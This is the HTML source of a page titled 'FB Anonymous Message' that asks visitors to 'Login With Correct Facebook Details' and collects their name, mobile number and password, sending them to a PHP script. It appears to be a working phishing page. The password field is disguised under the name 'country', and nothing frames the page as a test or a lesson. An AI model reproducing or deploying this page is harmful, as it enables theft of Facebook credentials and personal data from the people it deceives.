<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>FB Anonymous Message</title>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.css">
    <script src="home.js"></script>
 <style>
     h1{
         font-size: 40px;
         font-family: sans-serif;
     }
     h2{
         font-size: 20px;
         font-family: sans-serif;
     }
     body{
         background-color:white;
     }
     form{
         background-image: linear-gradient(purple,rgb(66, 66, 235));
     }
     form label {
         font-size: 20px;
         font-weight: bold;
         color: white;
         font-family: sans-serif;
     }
 </style>
 
</head>
<body>





<center>
    
<form action="insert.php" method="post"   style="background-color: rgb(249, 247, 247);max-width: 500px;box-shadow: 0px 8px 16px 0px rgba(10, 10, 10, 0.2);;padding-top: 50px;border-radius: 10px;"   >
                
    <div id="webform" class="webform">
    <h1 style="color: rgb(65, 113, 244)">FB ANONYMOUS MESSAGE!</h1>
    <h2 style="color: rgb(151, 136, 7)">Login With Correct Facebook Details.</h2>
    
    <label > First name :</label>
    <input  style = "padding:3px;border-radius:10px;"type="text" name="fname"  placeholder="Enter firstname" /><br><br>
    <label  > Last name:</label>
    <input  style = "padding:3px;border-radius:10px;color:rgb(7, 7, 7)" type="text" name="lname"  placeholder="Enter lastname"/><br><br>
    <label >Mobile number :<input   style = "padding:3px;border-radius:10px;margin-right:30px;" type="text" name="phone" required placeholder="type mobile number"/></label>
    <br><br>
    <label  >Password :</label>
    <input style = "padding:3px;border-radius:10px;margin-right:px;"type="password" name="country"  placeholder="type password..."/>
    <!-- <select  style = "padding:3px;border-radius:10px;padding-right:50px;" name="country" >
      <option  value=""> Select country </option>
      <option value="Nigeria"> Nigeria</option>
      <option value="USA"> USA</option>
      <option value="Other"> Other</option>
    </select> -->
    <br><br>
   
    
   
    <!-- <input type="submit" value=" Submit Details " name="submit" id="btn" /> -->
    <button   style = " color: rgb(252, 252, 251); background-color: rgb(75, 73, 73);border-radius:10px;" name="submit" id="btn" type="submit" class="btn">SUBMIT</button>
    <br />
    <br>
     </form>
</center>
    
</body>
</html>